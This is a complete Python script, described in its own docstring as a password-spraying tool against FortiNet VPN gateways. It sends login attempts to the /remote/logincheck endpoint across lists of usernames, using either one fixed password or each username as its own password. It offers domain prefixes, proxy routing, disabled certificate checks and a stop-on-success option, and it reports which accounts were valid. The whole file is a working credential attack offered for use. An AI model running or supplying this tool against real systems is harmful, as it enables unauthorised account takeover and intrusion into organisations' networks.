#!/usr/bin/env python3
"""
FortiNet VPN Gateway Password Spraying Script with Proxy Support
Supports HTTP and HTTPS proxies for authentication
"""

import requests
import argparse
import sys
from urllib.parse import urlparse


class RemoteHostLogin:
    def __init__(self, host, password, realm="", proxy=None, verify_ssl=True):
        """
        Initialize the remote host login client
        
        Args:
            host: Remote host URL (e.g., https://remotehost or https://192.168.1.1)
            password: Password for authentication
            realm: Optional realm parameter (default: empty string)
            proxy: Proxy URL (e.g., http://proxy:8080 or https://proxy:8080)
            verify_ssl: Whether to verify SSL certificates (default: True)
        """
        self.host = host.rstrip('/')
        self.password = password
        self.realm = realm
        self.verify_ssl = verify_ssl
        
        # Setup proxy configuration
        self.proxies = None
        if proxy:
            self.proxies = {
                'http': proxy,
                'https': proxy
            }
    
    def login(self, username, domain=None):
        """
        Perform login to the remote host with a specific username
        
        Args:
            username: Username for authentication
            domain: Optional domain to prepend to username (domain\\username)
        
        Returns:
            tuple: (success: bool, response: requests.Response)
        """
        url = f"{self.host}/remote/logincheck"
        
        # Prepend domain if provided
        if domain:
            full_username = f"{domain}\\{username}"
        else:
            full_username = username
        
        # Request headers
        headers = {
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Sec-Ch-Ua-Platform': '"Linux"',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Chromium";v="143", "Not A(Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'If-Modified-Since': 'Sat, 1 Jan 2000 00:00:00 GMT',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i',
            'Connection': 'keep-alive'
        }
        
        # Request body
        data = f"ajax=1&username={full_username}&realm={self.realm}&credential={self.password}"
        
        try:
            print(f"[*] Attempting login to {url} with username: {full_username}")
            if self.proxies:
                print(f"[*] Using proxy: {self.proxies['https']}")
            
            response = requests.post(
                url,
                headers=headers,
                data=data,
                proxies=self.proxies,
                verify=self.verify_ssl,
                timeout=30
            )
            
            print(f"[*] Response Status Code: {response.status_code}")
            print(f"[*] Response Headers: {dict(response.headers)}")
            print(f"[*] Response Body: {response.text}")
            
            # Check if login was successful
            # Invalid credentials return: ret=0,redir=/remote/login?&err=...
            # Valid credentials should return different response (e.g., ret=1 or success redirect)
            if response.status_code == 200:
                response_body = response.text.strip()
                
                # Check for failure indicators in response
                if 'ret=0' in response_body or 'err=' in response_body or 'sslvpn_login_permission_denied' in response_body:
                    print("[-] Login failed - Invalid credentials or permission denied")
                    return False, response
                else:
                    # Successful login (no error indicators present)
                    print("[+] Login successful - Valid credentials")
                    return True, response
            else:
                print(f"[-] Login failed with status code: {response.status_code}")
                return False, response
                
        except requests.exceptions.ProxyError as e:
            print(f"[-] Proxy error: {e}")
            return False, None
        except requests.exceptions.SSLError as e:
            print(f"[-] SSL error: {e}")
            print("[!] Try using --no-verify-ssl flag if you trust this host")
            return False, None
        except requests.exceptions.ConnectionError as e:
            print(f"[-] Connection error: {e}")
            return False, None
        except requests.exceptions.Timeout as e:
            print(f"[-] Timeout error: {e}")
            return False, None
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            return False, None


def main():
    parser = argparse.ArgumentParser(
        description='Remote Host Login Script with Proxy Support',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Simple login with single username
  python remote_login.py -H https://remotehost -u admin -p password123
  
  # Try multiple usernames with same password
  python remote_login.py -H https://remotehost -u admin root user -p password123
  
  # Try usernames from file with fixed password
  python remote_login.py -H https://remotehost -U usernames.txt -p password123
  
  # Test username as password (admin:admin, root:root, etc.)
  python remote_login.py -H https://remotehost -u admin root user --username-as-password
  
  # Test username as password from file
  python remote_login.py -H https://remotehost -U usernames.txt --username-as-password
  
  # Login with domain (DOMAIN\\username format)
  python remote_login.py -H https://remotehost -u admin -p password123 -D COMPANY
  
  # Multiple usernames with domain
  python remote_login.py -H https://remotehost -u admin root user -p password123 -D COMPANY
  
  # Username as password with domain (DOMAIN\\admin:admin)
  python remote_login.py -H https://remotehost -u admin root --username-as-password -D COMPANY
  
  # Login with HTTP proxy
  python remote_login.py -H https://remotehost -u admin -p password123 -P http://proxy:8080
  
  # Login with HTTPS proxy and authentication
  python remote_login.py -H https://remotehost -u admin -p password123 -P https://user:pass@proxy:8080
  
  # Username as password with realm and no SSL verification
  python remote_login.py -H https://remotehost -u admin root --username-as-password -r myrealm --no-verify-ssl
        """
    )
    
    parser.add_argument('-H', '--host', required=True, help='Remote host URL (e.g., https://remotehost)')
    parser.add_argument('-u', '--username', nargs='+', help='Username(s) for authentication (space-separated list)')
    parser.add_argument('-U', '--username-file', help='File containing usernames (one per line)')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-D', '--domain', help=r'Domain to prepend to username (e.g., DOMAIN\username)')
    parser.add_argument('--username-as-password', action='store_true', help='Use username as password (e.g., admin:admin, root:root)')
    parser.add_argument('-r', '--realm', default='', help='Realm parameter (optional)')
    parser.add_argument('-P', '--proxy', help='Proxy URL (e.g., http://proxy:8080 or https://user:pass@proxy:8080)')
    parser.add_argument('--no-verify-ssl', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('--stop-on-success', action='store_true', help='Stop trying usernames after first successful login')
    
    args = parser.parse_args()
    
    # Validate that either username or username-file is provided
    if not args.username and not args.username_file:
        parser.error("Either -u/--username or -U/--username-file must be provided")
    
    # Validate password requirements
    if not args.password and not args.username_as_password:
        parser.error("-p/--password is required unless --username-as-password is used")
    
    if args.password and args.username_as_password:
        parser.error("Cannot use both -p/--password and --username-as-password at the same time")
    
    # Build username list
    usernames = []
    if args.username:
        usernames.extend(args.username)
    
    if args.username_file:
        try:
            with open(args.username_file, 'r', encoding='utf-8') as f:
                file_usernames = [line.strip() for line in f if line.strip()]
                usernames.extend(file_usernames)
                print(f"[*] Loaded {len(file_usernames)} usernames from {args.username_file}")
        except FileNotFoundError:
            print(f"[-] Error: Username file '{args.username_file}' not found")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error reading username file: {e}")
            sys.exit(1)
    
    if not usernames:
        print("[-] Error: No usernames provided")
        sys.exit(1)
    
    print(f"[*] Total usernames to try: {len(usernames)}")
    
    if args.domain:
        print(rf"[*] Domain: {args.domain} (will be used as {args.domain}\username)")
    
    if args.username_as_password:
        print("[*] Mode: Username will be used as password (e.g., admin:admin)")
        if args.domain:
            print(f"[*] Note: Password will be username only, not including domain")
    else:
        print(f"[*] Mode: Using fixed password for all usernames")
    print()
    
    # Disable SSL warnings if verification is disabled
    if args.no_verify_ssl:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        print("[!] SSL certificate verification is disabled")
        print()
    
    # Try each username
    successful_logins = []
    failed_logins = []
    
    for i, username in enumerate(usernames, 1):
        print(f"\n{'='*60}")
        
        # Build display username (with domain if provided)
        display_username = rf"{args.domain}\{username}" if args.domain else username
        print(f"[*] Trying username {i}/{len(usernames)}: {display_username}")
        
        # Determine password to use
        # Note: When using username-as-password, the password is the username WITHOUT domain
        if args.username_as_password:
            current_password = username
            if args.domain:
                print(rf"[*] Using credentials: {args.domain}\{username}:{username}")
            else:
                print(f"[*] Using username as password: {username}:{username}")
        else:
            current_password = args.password
            print(f"[*] Using username: {display_username}")
        
        print(f"{'='*60}")
        
        # Create login client with current password
        client = RemoteHostLogin(
            host=args.host,
            password=current_password,
            realm=args.realm,
            proxy=args.proxy,
            verify_ssl=not args.no_verify_ssl
        )
        
        success, response = client.login(username, domain=args.domain)
        
        if success:
            # Store the full username with domain for display
            full_username_display = rf"{args.domain}\{username}" if args.domain else username
            successful_logins.append(full_username_display)
            print(f"[+] SUCCESS: Login succeeded for username: {full_username_display}")
            
            if args.stop_on_success:
                print("[*] Stopping as --stop-on-success flag is set")
                break
        else:
            full_username_display = rf"{args.domain}\{username}" if args.domain else username
            failed_logins.append(full_username_display)
            print(f"[-] FAILED: Login failed for username: {full_username_display}")
    
    # Print summary
    print(f"\n{'='*60}")
    print("SUMMARY")
    print(f"{'='*60}")
    print(f"Total usernames tried: {len(successful_logins) + len(failed_logins)}")
    print(f"Successful logins: {len(successful_logins)}")
    print(f"Failed logins: {len(failed_logins)}")
    
    if successful_logins:
        print(f"\n[+] Successful usernames:")
        for username in successful_logins:
            print(f"    - {username}")
    
    if failed_logins:
        print(f"\n[-] Failed usernames:")
        for username in failed_logins:
            print(f"    - {username}")
    
    # Exit with appropriate code
    if successful_logins:
        print("\n[+] At least one login was successful")
        sys.exit(0)
    else:
        print("\n[-] All login attempts failed")
        sys.exit(1)


if __name__ == '__main__':
    main()
